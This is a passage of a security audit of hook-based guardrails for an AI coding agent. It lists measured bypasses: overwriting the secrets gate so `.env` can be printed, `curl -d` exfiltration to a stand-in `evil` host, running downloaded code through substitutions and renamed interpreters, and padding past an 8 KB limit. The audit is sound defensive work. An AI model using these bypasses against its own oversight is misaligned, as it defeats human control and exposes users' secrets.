| C-3 | **Nothing protects the gate substrate from itself** | **STILL TRUE @ e47d827.** Re-measured end-to-end on a stock install with a canary `.env`, positive control first: the five-hook Bash chain DENIES `cat .env` and `pip install evil`. Then `printf "exit 0" > .claude/hooks/secrets-gate.sh` is **allowed** by all five and executes (secrets-gate.sh becomes 6 bytes); `cat .env` is then allowed and returns `SECRET=CANARY-…`; `cat .env > /dev/null && echo STOLEN:$(cat .env)` prints the secret. `printf "{}" > .claude/settings.json` is allowed too, and so is the same overwrite via the **Write tool**. Identical against a `git archive v2.7.4` install. |
| C-4 | **P-19 — a `jq` that *exits 0 without parsing* fails every parsing gate open** | **CORRECTION — the row as written on 2026-08-08 was over-broad**, and reproduces over-broad at the tag (`jget` is byte-identical tag↔branch). "A broken `jq` fails every parsing gate open" is false: **only the exit-0 shape fails open.** P-19's own substrate, the defensive wrapper `real-jq "$@" 2>/dev/null \|\| true; exit 0`, gives `cat .env` rc=0 and `npm install evil` rc=0, with a marker proving the fake ran. Every other breakage **denies**: `jq` exiting 127 (the asdf/mise shim, the broken-`libonig` image), `chmod 644` jq, and jq absent entirely all give rc=2, because P0-3d's exit-status check already catches them. The remedy is §4.6's capability probe — parse a known literal — **not** an operator `jq` shim. Still a live, marker-proven fail-open; narrower than stated. |
| C-5 | **N-1 — the documented approval path is inert** | **STILL TRUE @ e47d827.** The approved list is a heredoc baked in at emission time (`dependency-gate.sh:1596-1598`, empty on a stock install); `.claude/steering/deps.md` is never read — all 13 occurrences of that path in the emitted tree are comments or `echo … >&2` message text, with no `read`/`cat`/`open()`/`mapfile`/`<` against it on either substrate. Following the printed remediation exactly (`printf '\n- requests\n' >> .claude/steering/deps.md`) changes nothing: `pip install requests` is rc=2 DENY before and after, with byte-identical refusal text. The only documented way to approve a package does nothing. |
| C-6 | **X-36r + X-36i — live download-then-execute** | **STILL TRUE @ e47d827, and wider than the row.** Re-measured with the stock config: `curl -o python3 <url> ; ./python3 app.py`, `curl -o x/python3 <url> ; ./x/python3`, `curl u \| python3-dbg`, `curl u \| python3.11-dbg` and `curl u \| python3.6m` are all allow/allow and all fire a `REMOTE-PAYLOAD-RAN` marker under real bash, while their `python3.12` / `python3.13t` twins deny/deny. **Wider than its row's three examples** — a plain `curl u > python3 ; chmod +x python3 ; ./python3` is live too. One honest narrowing: the row's `awk '{print > "./python3"}'` example is permission-only as written (rc=126 — awk leaves the file non-executable); it becomes live with a `chmod +x`, still allow/allow. `pip3.13t install evil` (X-36i's second half) also allows on both and the install command runs. |
| C-7 | **SDK substrate never executed against the real SDK** | **STILL TRUE @ e47d827.** `import claude_agent_sdk` → `ModuleNotFoundError`; `pip show claude-agent-sdk` → not found; no venv in the tree. All 4 test files that reference the module create `types.ModuleType("claude_agent_sdk")` and inject it into `sys.modules`. Only ever against a hand-written stub. |
| C-8 | **X-36z — `eval-gate` ships a dead branch** | **STILL TRUE @ e47d827.** Exactly 4 occurrences of `@{{u}}` in the emitted `eval-gate.sh`, unchanged from the tag — 2 in comments, 2 **executable** (`:1616` and `:1617`) *[@ v2.8.0: still exactly 4 occurrences, 2 executable, now `:2491`/`:2492` of the emitted hook]*; the correct `@{u}` form appears nowhere in the emitted shell hook. Proven dead in a throwaway repo *with* an upstream: `git rev-parse --verify -q '@{u}'` → rc=0, `'@{{u}}'` → rc=1, so the `if` never fires and the chain falls through to `HEAD~1`. The SDK spells it correctly (`gates.py:3336`, `("@{u}..HEAD", "HEAD~1")`), which is the source of the disagreement. |

**K-2 sharpens all of the above, and CORRECTION — the true ratio is worse:
"7 of 11" is never true of any one install.** Recounted from the emitted
artifacts (and identical at the tag): `_GATE_FACTORIES` always holds **7**
factories, but `_enabled_gates(RESOLVED_CONFIG)` turns on only what the config
asked for.

| install | SDK gates enabled | shell hooks wired |
|---|---|---|
| **stock** (`service`, `tdd_policy: encouraged`) | **5** | **11** |
| `ai-agent` + `tdd_policy: required` | 7 | 13 |
| …plus the autonomous modes | 7 | 15 |

Shell-only on the stock install is exactly K-2's list — `ci-mirror`,
`cost-log`, `decision-required-alarm`, `drift-detector`, `spec-gate-entry`,
`task-done-alarm`; the SDK's `eval-gate` and `tdd-gate` factories have no shell
counterpart there. Measured live with a deliberately failing `ci_local` (so the
gate *can* deny): `git push` → shell **DENY** via `ci-mirror`, SDK **allow** on
all seven. Under `gate_substrate: sdk-callable`, `git push` is ungated — and
every "the substrates agree" claim is scoped to the five-or-seven both carry.

---

## 4. What is genuinely good — the case against over-correcting

The ship advocate's valid points survive, and a fair report states them:

- **Adoption mechanics are production grade.** `git archive v2.7.4` yields a
  self-contained tree; install is `create=57`, rc=0, deterministic, no network,
  no dependency on the source repo. Uninstall/re-install is clean.
  *(Re-confirmed 2026-08-09: `create=57 rc=0` from both the tag archive and the
  branch working tree, byte-identical config.)*
- **The historically worst failure class is genuinely closed.** On a 29-binary
  minimal `PATH` (no `jq`, no `python3`) the gates **deny** rather than fall
  through — the P0-3a–c fail-open class is fixed and stays fixed. *(2026-08-09
  adds a corroborating datum: with `jq` absent from a 19-binary minimal `PATH`,
  `secrets-gate` on `cat .env` is rc=2 DENY. See C-4.)*
- **The accidental threat model is fully defeated**, and that is the
  high-volume one. `pip install requests`, `npm install left-pad`,
  `cargo add serde` all deny on a default install.
- **The project's self-knowledge is largely accurate.** Two lenses hunting for
  *undocumented* bypasses came back nearly empty — the big one in §2 is the
  exception, and it is a real one.
- **Failures are loud and in the safe direction.** `auto.sh` exits 1 rather
  than pretending.
- **CHANGED @ e47d827 — add one:** the project's response to §2 was itself
  disciplined. The confounded corpus row was corrected *before* the code, the
  fix was pinned with 95 new rows, and the pin was validated by **falsification**
  (neuter both walkers → 3,971 / 57 failed) rather than by a green run. The
  residues it could not close were **ledgered** rather than quietly left —
  X-37, X-38, X-39, X-40, X-41, X-42, X-43.

**"93 open rows" is not itself the alarm** *(88 at the tag — see §5)*. Most are
documentation, cosmetics, or explicit owner decisions. The alarm was §2, which
was not in those rows at all — and note which way the count moved: closing §2's
Class A could not decrement it, because the finding was never a row, while the
review rounds that closed it filed five new ones.

---

## 5. Backlog triage — **93** `open` *(88 at the tag)*, of which ~12 actually block

> *Counts here are the 2026-08-09 figures. On `main` @ 560588c the same rows
> number **101** by a looser `grep -c '`open`'` pattern whose base differs from
> this section's; the DELTA is the comparable quantity, not the base.*

**CHANGED @ e47d827 · MEASURED.** The original heading read *"88 `open`, of
which ~10 actually block"*. That was correct for the tag and has been
re-derived, not inherited.

Counted by **explicit status token** — rows whose last backticked legend token
is `open`, discarding retro-notes of the form ``(was `open`)``. That rule
reproduces to the row against `git show v2.7.4:docs/deferred-backlog.md` (88)
and against `main` (88), and returns **93** on the branch. The arithmetic:

```
88  − X-36s − X-36t   (both flipped `open` → `done` on this branch)
    + X-37 + X-38 + X-39 + X-40 + X-41
    + X-42 + X-43
=  93
```

**A caveat on that rule, and it cost two attempts to get right.** The status is
the FIRST legend token in the row's last cell, not the last token on the line:
`X-36y`'s status cell opens ``​`open`​`` and then quotes other rows, so a
last-token parser scores it `true` and undercounts. Two independent naive
parsers disagreed (87 and 89) before the rule was stated precisely; the 88/88/93
figures above are the ones that reproduce. X-42 and X-43 counted **zero** when
this revision was measured because they carried no status cell at all — that is
now repaired (both `open`), which is the whole of the 91 → 93 difference.

**The number is a floor, not a total.** It omits 17 rows that are open only by
section caption — section D (*"`open` unless the row itself says otherwise"*,
D-1…D-8) and section G (*"All `open` unless noted"*, 9 rows) — and 2 rows
labelled outside the legend (X-36h `partially fixed`, X-36n `fixed`). Under the
file's own legend the actionable-open total is **110**, not 93. State the unit,
not the bare number.

| class | count (branch) | count (tag) |
|---|---|---|
| (a) live exploitable fail-open | **19** | 14 |
| (b) DoS / performance ceiling | 6 | 6 |
| (c) correctness, no security impact | 52 | 54 |
| (d) documentation or cosmetic | 12 | 12 |
| (e) deferred by explicit owner decision | 1 | 1 |
| (fixed but still `open`) | 1 (J-12) | 1 (J-12) |

**CORRECTION on how to read this table.** The 2026-08-08 split (16 / 8 / 36 /
26 / 2) does **not** reproduce; nor does any other split, because the five-way
classification is a *judgement over row text*, not a measurement. The figures
above come from one written rule applied identically to both trees — (a) = the
row asserts a gate ALLOWS on the current tree something it exists to refuse, or
trusts an agent-writable anchor; (b) = DoS / timeout / livelock; (d) = prose,
citations, comments, tracking-file hygiene; (e) = explicit owner deferral;
(c) = everything else — and the (c)/(d) boundary is where any two readers will
diverge hardest. **Only (a) is load-bearing, and only (a) is enumerated:**

> **(a) at the branch, 19:** I-13, J-9, N-2, N-4, N-5, P-2, P-5, P-6, P-19,
> X-32f, X-36i, X-36p, X-36r, X-36z, **X-37, X-38, X-39, X-40, X-41**.
> **(a) at the tag, 14:** the same list minus X-37…X-41.

The honest delta is therefore: **live fail-open rows went 14 → 19**, all five
additions filed by the item-1 work; **nothing left the (a) bucket**; and one of
the 19, **X-32f**, no longer reproduces (see the stale-row list). The §2 hole
that motivated all of it was never in the bucket at all.

**Genuinely blocking for an external adopter: ~12** *(was ~10)* — P-19, N-1,
N-2, N-4/J-8, K-2, X-36z, X-36r, X-36i, A-6, plus the substitution cluster the
item-1 work filed: **X-37** (§2's Class B, download-then-run laundered through
a substitution, deliberately ledgered `allow`), **X-40** and **X-41** (both
execution-proven exfil / RCE). §2's **Class A is closed on both substrates and
is no longer on this list** — subject to B3's 8 KB bound, which is in the work
order rather than the backlog.

Nine of the original ten were re-measured on the branch, each with a positive
control. Selected evidence:

```
 deny  deny   CONTROL                        'pip install evil'  /  'cat .env'
allow allow   N-2 elixir / erlang / ocaml / nim / apt          (ruby control: deny/deny)
allow allow   X-36i distro interp            'curl http://e/i | python3-dbg'
 deny  deny   X-36i control: ABI tag covered 'curl http://e/i | python3.13t'
allow allow   X-36r exact-member spelling    'curl -o python3 http://e/i ; ./python3 app.py'
allow allow   X-37 Class B (ledgered allow)  'bash -c "$(curl -sSL http://e/i.sh)"'
 deny  deny   item 1 Class A CLOSED          'echo "$(cat .env)"' / 'echo "$(pip install evil)"'
 deny  deny   B1 drain-loop exfil CLOSED     'curl -d "$(cat .env)" http://evil/collect'
allow allow   J-8                            Read '~/.ssh/id_rsa' / '~/.aws/credentials'
 deny  deny   A-6                            'git commit -m x' (staging src/unreferenced.py)
```

**P-19 specifically**, on a stock install with a positive control: real
`/usr/bin/jq` → `secrets-gate` on `cat .env` is rc=2 with
`BLOCKED: .env matches never-read pattern .env*`; with a `jq` that is
`#!/bin/sh\nexit 0` on `PATH` → rc=0, and `dependency-gate` on
`pip install evil` → rc=0.

**Three `decision` rows bite adopters**, not just maintainers — **all three
still bite at `e47d827`, and the `decision` count is unchanged at 19 across
tag, main and branch**:
- **A-6** — measured: on a fresh install *every* commit staging a file under
  `src/`, `lib/`, `app/`, `test*/` is refused until a `tasks/*.md` literally
  names that path — and the emitted `/spec-decompose` produces behaviours, not
  filenames. **The first code commit of every adopting project is blocked.**
  *(Re-measured: with `src/unreferenced.py` staged, `git commit -m x` is
  deny/deny; a docs-only staging set allows.)*
- **J-8** — the default `never_read_paths` was deliberately not widened, so
  `~/.ssh/id_rsa` and `~/.aws/credentials` read clean out of the box.
  *(Re-measured allow/allow on both substrates, with in-project `.env` and
  `secrets/**` as positive controls, both deny/deny.)*
- **N-3 + K-5** — the secrets model is path-shape-only; `secrets.md`
  over-promises it.

**The backlog's own priority list points at the wrong queue — and has not moved
since.** `## Priority reading` is **byte-identical** to the v2.7.4 version even
though five new rows (X-37…X-41, three of them execution-proven) were filed
under it. It names cluster B, cluster E and P-1 as the top — and mentions none
of P-19, N-1, N-2, N-4, N-5, K-2, X-36r, X-36i, X-36z, A-6, J-9, or any of
X-37…X-41. The file's `**Snapshot:**` header also still reads
`main @ 3c0a2de`, 2026-07-21, which predates eight of its eighteen sections.

**Stale rows found by spot-check** (all re-measured at `e47d827`, each with a
positive control):

- **J-12** is already fixed and still marked `open` — the walker denies
  `git -c core.editor='vi x' commit -m x` on both substrates, while the
  false-positive control `echo "git commit"` still allows. *Note the
  instrument:* with nothing staged, **every** `spec-gate-commit` probe returns
  allow/allow, so a spot-check without a staged `src/` file proves nothing.
  (The 2026-08-08 spot-check had no such control.)
- **N-4**'s framing is wrong — traversal does *not* defeat the gate
  (`../other/x.pem`, `/tmp/x.pem` all rc=2, on both substrates, via the Read
  tool as well as Bash); the row's own payloads `../../etc/passwd` and
  `/etc/shadow` allow because they match no configured pattern. The real defect
  is a short default pattern list, so the row sends a fixer to the wrong
  mechanism.
- **X-32f** — **new on 2026-08-09**, and stale in the same way N-4 is. The row
  asserts `curl u >>a.sh ; sh a.sh` is shell-allow / SDK-deny. Measured
  **deny/deny** on the branch, on `main`, **and on a `git archive v2.7.4`
  install** (emitted hooks byte-identical tag↔main), for the verbatim payload
  and for `>`/real-URL variants. So the cited payload was already stale when
  this document was written. Only the cited payload was tested; the row's wider
  claim that "the underlying segmenter disagreement is still live elsewhere" is
  untested here — **re-point the row at a payload that reproduces, rather than
  closing it.**

**Rows for the work that landed verify correctly.** X-32j is `done` and its
unconfounded probe now denies; X-36s and X-36t are ``done`` (``(was `open`)``)
and their payloads are allow/allow with the bounding controls still deny/deny;
X-32i is `done` and its payloads deny. B1, B2 and B5 have no rows of their own
— correctly, since they landed as fixes — but B5's two ledgered costs did get
rows, **X-42** (heredocs unmodelled by both walkers) and **X-43** (test-gate
shell-deny / SDK-allow for CR before a `#`). Both were filed WITHOUT a status
cell — found by this revision and repaired the same day.

**P-18's own number is now doubly stale, and the class has grown a second
direction.** Rows carrying **more** cells than their header: 10 (as P-18 says)
→ **13** at the tag (what this document measured on 2026-08-08) → **15** now;
the two newest offenders, X-37 and X-41, were added by the very batch that
filed them. The opposite defect also appeared: **X-42 and X-43 were filed with
FEWER cells than the header** (2 in a 3-column table), so their Status column
rendered empty and the legend could not classify them at all. Found here and
fixed on 2026-08-09 — they now carry `open`, which is why the count is 93 and
not 91. Both directions are the same root cause: rows are hand-assembled and
nothing validates the column count.

---

## 6. Refuted — recorded so the report is not one-sided

- **X-36u / X-36x are NOT exploitable.** The forbidden-direction splits
  reproduce, but no member both parses in bash and reaches a gate; every
  executable rebuild is deny/deny.
- **N-4 is not a traversal hole** (see above). *(Re-measured 2026-08-09,
  unchanged.)*
- The author's own initial doubt about C-2 — that `loop.sh` contains 8
  `claude -p` occurrences and therefore dispatches — was **wrong**; all are
  comments or `echo` advisories. Checked rather than assumed, in both
  directions.

### 6.1 Corrections to this document itself (2026-08-09)

Recorded here rather than silently patched, because the point of this document
is that it is trustworthy. Each reproduces on a `git archive v2.7.4` install,
so each is an error made on 2026-08-08 — **not** a regression on the branch:

| where | said | is |
|---|---|---|
| §2 heading | "9,462 green checks" attributed to the tag | 9,462 is `main` @ 6f77ccc; the tag is **9,416** across 24 files |
| §2 table | three SDK cells `—` | measurable; DENY / ALLOW / ALLOW at the tag |
| §3 C-2 | "the remaining two are `echo` advisories" | **four** non-comment occurrences (2 in each file), all echoes |
| §3 C-4 | "a broken `jq` fails every parsing gate open" | only a `jq` that **exits 0 without parsing** does; exit-127, `chmod 644` and jq-absent all **deny** |
| §3 C-6 | the row's `awk '{print > "./python3"}'` example runs | rc=126 as written; live only once a `chmod +x` is added |
| §3 K-2 | "the SDK substrate carries **7 of 11** gates" | never true of one install: stock is **5 of 11**; `ai-agent`+tdd is 7 of 13 |
| §5 | the 16 / 8 / 36 / 26 / 2 class split | does not reproduce under any written rule; only bucket (a) is defensible, and it was **14** at the tag |
| §5 | "13 rows carry more cells than their header" | correct at the tag; **15** now, plus 2 rows with *fewer* |
| §9 | `main` moved "docs and tests only, no emitted change" | one line of `lib/templates.py` moved too — a citation inside a comment in the emitted iteration-summary Stop hook |
| §8.1 *(added 2026-08-10)* | **B4** queued *behind* B3 | backwards — B4 is a COST fix and X-44 itself says a delimiter budget is unaffordable until the per-delimiter cost is bounded, so B4 landed first. **X-45**, which did not exist when §8 was written, is what actually closed the crossing |

---

## 7. The softer reading

Under *maintainer-operated, single project, gates treated as advisory*, the
verdict changes to **usable with eyes open**: the installer is sound, the
accidental threat model is covered, and the failure modes are disclosed. The
gates then function as a seatbelt against mistakes, not as a control against an
adversary — which is what §2 actually establishes.

**What the tag must not be marketed as** is a security boundary against a
motivated agent or a compromised dependency. `docs/threat-model.md` (draft
2026-08-13, not yet emitted into installs) now states this calibration in the
adopter's own terms — it is the disclosure this section says the tag must
carry, and it reaches no install yet.

**CHANGED @ e47d827:** the branch does not change this paragraph. It makes the
seatbelt fit better — a whole class of accidental-and-deliberate substitution
shapes now denies — but §2.2's 8 KB cliff and §2.3's live Class B mean the
"not a boundary against a motivated agent" sentence is *still exactly right*,
and a motivated agent needs only padding.

---

## 8. Fix order

**Status as of 2026-08-09**, on branch `fix/item1-dquote-command-substitution`
@ e47d827 (unpushed; nothing below has landed on `main` or in any tag).

1. **Close the double-quoted command-substitution hole** on both substrates —
   in the shared segmenter, and **fix `test_substrate_differential.py:2304`'s
   confounded row first** so the fix is pinned. Re-check X-32j, which cites the
   confound as proof.
   **[PARTIALLY DONE — Class A closed 2026-08-08; item 1 is still open.]**
   The plan-review found the hole is TWO classes and the naive fix falsifiable
   (nested `"$(cat ".env")"`, escaped `\$(`, single-quote-in-double,
   subst-wrapping-invoker all defeat a per-run extractor).
   **Class A** — a read/install at a command position inside the substitution —
   is closed on both substrates by a quote-and-escape-aware walk
   `_cs_subst_scan` (shell `_HOOK_HEADER`, seeded into `cmd_segments` and
   `_sg_pass`) and its exact twin SDK `_subst_inners` (wired into BOTH the
   dependency/invoker and the secrets `_segment_candidates` paths).
   **52 rows flip allow/allow → deny/deny** — the `_DQCS` section has grown
   from 41 rows at `850f61c` (where the original count was *14 of 41*) to 95 at
   `e47d827`; the unit is the same, the count nearly quadrupled. Every
   boundary/FP row (single-quote, escaped `\$`, arithmetic, benign subs, prose)
   stays allow; **0 divergences across all 4,028 checks**. Verified by
   falsification: neutering both walkers turns 55 of those rows red. The
   confounded AXIS-9d row is corrected and X-32j reopened→closed. Freeze
   exception no. 50 (every hook body + gates.py move).
   **Still open, and both are release-blocking:**
   - **Class B / item 1b / backlog X-37** — download-then-run laundered through
     a substitution (`bash -c "$(curl)"`, `eval`, bare/backtick/process-sub) is
     a DISTINCT correlation, ledgered `allow` in the differential corpus
     (pre-existing, not a regression). Still executes a real remote payload.
   - **B3 — `_SUBST_MAXLEN = 8192`** truncates the segment *before* the walk on
     both substrates, so **Class A itself reverts to allow/allow above 8,195
     bytes**, measured with the canary exfiltrated (§2.2). One number serving
     two denominators; the cliff is exact at 8,177 bytes of padding.
   **Item 1 is release-blocking until BOTH 1b/X-37 and B3 land.** Follow-ups
   **B1** (secrets-gate drain-loop exfil), **B2** (the D20 download-then-run
   driver) and **B5** (the substitution walk ran before the `#`-comment strip)
   landed 2026-08-09 in `7ef6b0b` / `e47d827`; B5 added ledger rows **X-42**
   (heredocs unmodelled by both walkers) and **X-43**. **None of B1/B2/B5 moved
   any row of §2's table** — that table was already closed by `850f61c` alone,
   so the headline must not be credited to them. ~~Also queued behind B3: **B4**
   (~6 KB exhaustion divergence), **X-40**, **X-39**, **X-38**, **X-41**.~~
   **CHANGED @ main — the ordering above was wrong about B4, and the
   queue has changed shape:**
   * **B4 did NOT wait behind B3** — it landed first (`b0d30fc`), because the
     ~6 KB crossing is a *cost* defect and B3's own X-44 row says a delimiter
     budget is unaffordable until the per-delimiter cost is bounded.
   * **X-45 (`5969fa9`) is what actually closed the crossing**, and it is a row
     that did not exist when this section was written: B4 bounded the walk and
     the gate cost barely moved, because the cost was never the walk. Both are
     in `main`; the shape is 65.08 s → 7.64 s (see the SUPERSEDED assessment above, and the RE-BASE for what is current).
   * **B3 is BUILT and PARKED**, not queued — `wip/b3-flat-budget` (`395b955`).
     Its design is validated (0 walker divergences over 41 charging cases, six
     deliberately wrong builds each caught) but its cost backstop pushes benign
     lift-heavy commands past the same 60 s ceiling, so **its precondition is
     now X-36y** — bound `_cs_scan`'s per-run tail re-slice with B4's
     front-window technique. That is the second time an item in this area
     shipped ahead of its cost precondition, which is the reusable lesson.
   * **Still queued, unchanged:** **X-40**, **X-39**, **X-38**, **X-41**.

   **Revised order for item 1:** X-36y → re-land B3 (re-measuring its backstop
   on a *lift-heavy* shape, not a padded one) → X-40 → X-39+X-38 → X-41 → X-37.
2. **Add a LICENSE** and re-tag. Hours of work; blocks everything else.
   **[NOT DONE — still absent at tag, `main` and branch.]**
3. **Make the gate substrate self-protecting** — deny writes to
   `.claude/hooks/**` and `.claude/settings.json`. **[NOT DONE — C-3
   reproduces end-to-end on the branch, including via the Write tool.]**
4. **Ship the X-36r fix** — its row records a measured zero-collateral change.
   **[NOT DONE — and C-6 is wider than the row: a plain
   `curl u > python3 ; chmod +x python3 ; ./python3` is live too.]**
5. **Un-double `@{{u}}`** (X-36z) — one line plus a pin. **[NOT DONE — still 4
   occurrences, 2 executable, in the emitted `eval-gate.sh`.]**
6. **Widen default `never_read_paths`** to `~/.ssh/**`, `~/.aws/credentials`,
   `/etc/shadow`. **[NOT DONE — all three still read clean.]**
7. **Resolve A-6**, or the first commit of every adopting project is blocked.
   **[NOT DONE.]**
8. **Make the autonomous-mode flags honest** — either implement dispatch or
   stop shipping flags that read as ordinary booleans. **[NOT DONE —
   wrappers byte-identical to the tag.]**

Items 1–3 are release-blocking. 4–6 are one-liners with measured fixes ready.

**Two housekeeping items this revision adds**, neither release-blocking but
both cheap and both eroding the tracker's trustworthiness:

9. **Re-point or close X-32f** — its cited payload is deny/deny at the tag, on
   `main` and on the branch, so it currently sends a fixer at nothing.
   Similarly, mark **J-12** `done`.
10. **Repair the tracker's own metadata** — the `**Snapshot:**` header
    (`main @ 3c0a2de`, 2026-07-21) predates eight sections; `## Priority
    reading` is byte-identical to the v2.7.4 version and names none of the
    twelve genuinely blocking rows *(@ v2.8.0: rewritten by the X-52 line — no
    longer byte-identical — but still names none of the twelve; the Snapshot
    header still reads `main @ 3c0a2de`)*; and P-18's "10 over-celled rows" is now 15.
    *(The X-42/X-43 missing-status half of this item was fixed on 2026-08-09.)*

---

## 9. Limits of this analysis

- **Written against tag `v2.7.4`, and the tag has not moved.** `main` is still
  `6f77ccc`. **CORRECTION:** the original bullet said main's move was "docs and
  tests only, no emitted change" — `v2.7.4..main` also touches one line of
  `lib/templates.py`, a citation inside a comment in the emitted
  iteration-summary Stop hook (`:654-655` → `:775-776`). It is behaviourally
  inert and invisible under the stock and differential configs — the emitted
  hooks and `gates.py` are byte-identical tag↔main — but it *is* an
  emitted-bytes change for a goal-mode install.
- **The 2026-08-09 revision measures an unpushed branch.**
  `fix/item1-dquote-command-substitution` @ `e47d827` is not merged, not
  pushed, and not tagged. Everything marked *CHANGED @ e47d827* describes work
  that **no external adopter can obtain**. Nothing on the branch changes the
  tag's verdict, and the branch's own verdict is also not-ready.
  For attribution the branch *does* move emitted bytes — every hook +226 lines
  from the shared `_HOOK_HEADER` substitution walk, `secrets-gate.sh` +282,
  `gates.py` +262 — and none of C-1…C-8 or the K-2 sharpener is affected by
  any of it.
- **The revision re-measured §1, §2, §3, §5, §8 and §9.** §4's "genuinely
  good" bullets were re-confirmed only where a lens happened to cross them
  (`create=57 rc=0`, jq-absent denies, the accidental-install denies as
  positive controls); the 29-binary minimal-`PATH` sweep and the §6 refutations
  of X-36u/X-36x were **not** re-run. §7 is argument, not measurement.
- The SDK substrate was exercised through the same stub the suite uses, because
  `claude_agent_sdk` is not installed here. **C-7 is therefore unverified in
  the direction that matters** — nobody has run these gates against the real
  SDK. *(Re-checked 2026-08-09: still not installed; all 4 test files that
  reference it inject a `types.ModuleType` stub.)*
- **The tag and `main` suite totals were measured from `git archive`
  extractions**, where `tests/test_doc_citations.py` cannot run (no git index).
  The branch total (9,568 / 0) and the differential total (4,028 / 0) were
  measured in a real checkout.
- No adversary was modelled beyond command-line payloads: no prompt injection,
  no malicious MCP server, no compromised model output.
- Retrofit mode (`RETROFIT_PROTOCOL_VERSION 1.6.2`) is out of scope by owner
  decision **J-21** and was not assessed for production use.
